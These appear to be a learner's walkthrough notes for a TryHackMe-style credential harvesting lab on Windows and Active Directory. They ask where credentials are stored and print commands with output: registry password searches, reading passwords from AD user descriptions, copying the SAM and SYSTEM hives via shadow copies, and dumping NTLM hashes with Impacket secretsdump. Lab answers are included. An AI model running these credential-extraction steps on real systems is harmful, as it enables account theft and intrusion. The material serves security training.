# Credharvesting
- After gaining access to a system we need to find creds.

## Credentials are stored insecurely in various locations in systems:
-   Clear-text files
 -   Database files
 -   Memory
 -   Password managers
 -   Enterprise Vaults
 -   Active Directory
 -   Network Sniffing

## The following are some of the types of clear-text files that an attacker may be interested in:
- Commands history
-  Configuration files (Web App, FTP files, etc.)
- Other Files related to Windows Applications (Internet Browsers, Email Clients, etc.)
- Backup files
- Shared files and folders
- Registry
- Source code 

## As an example of a history command, a PowerShell saves executed PowerShell commands in a history file in a user profile in the following path: 
    C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 

    
## Searching for the "password" keyword in the Registry        
- c:\Users\user> reg query HKLM /f password /t REG_SZ /s
- C:\Users\user> reg query HKCU /f password /t REG_SZ /s

## Task 3
Use the methods shown in this task to search through the Windows registry for an entry called "flag" which contains a password. What is the password?
Use findstr to grep THM text only

```
PS C:\Users\thm> reg query HKLM /f password /t REG_SZ /s | findstr flag
  flag    REG_SZ    password: 7tyh4ckm3
```    

Enumerate the AD environment we provided. What is the password of the victim user found in the description section?
Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description

```
PS C:\Users\thm> Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description

Name          SamAccountName Description
----          -------------- -----------
Administrator Administrator  Built-in account for administering the computer/domain
Guest         Guest          Built-in account for guest access to the computer/domain
krbtgt        krbtgt         Key Distribution Center Service Account
THM User      thm
THM Victim    victim         Change the password: Passw0rd!@#
thm-local     thm-local
Admin THM     admin
svc-thm       svc-thm
THM Admin BK  bk-admin
test          test-user
sshd          sshd
```
## Task 4
Confirming No Access to the SAM Database 
```
C:\Windows\system32>type c:\Windows\System32\config\sam
type c:\Windows\System32\config\sam
The process cannot access the file because it is being used by another process.

C:\Windows\System32> copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\ 
copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\
The process cannot access the file because it is being used by another process.
        0 file(s) copied.
```

Creating a Shadow Copy of Volume C with WMIC
- Be sure to run Administrator Command Prompt
```
C:\Users\Administrator>wmic shadowcopy call create Volume='C:\'
Executing (Win32_ShadowCopy)->create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ReturnValue = 0;
        ShadowID = "{D8A11619-474F-40AE-A5A0-C2FAA1D78B85}";
```
Listing the Available Shadow Volumes
```
C:\Users\Administrator>vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {0c404084-8ace-4cb8-a7ed-7d7ec659bb5f}
   Contained 1 shadow copies at creation time: 5/31/2022 1:45:05 PM
      Shadow Copy ID: {d8a11619-474f-40ae-a5a0-c2faa1d78b85}
         Original Volume: (C:)\\?\Volume{19127295-0000-0000-0000-100000000000}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: Creds-Harvesting-AD.thm.red
         Service Machine: Creds-Harvesting-AD.thm.red
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessible
         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential
```

Copying the SAM and SYSTEM file from the Shadow Volume
```
C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
        1 file(s) copied.

C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
        1 file(s) copied.
```
Save SAM and SYSTEM files from the registry
```
C:\Users\Administrator\Desktop>reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>reg save HKLM\system C:\users\Administrator\Desktop\system-reg
The operation completed successfully.
```
Decrypting SAM Database using Impacket SecretsDump Script Locally
```
           
user@machine:~# python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```
## Task 5

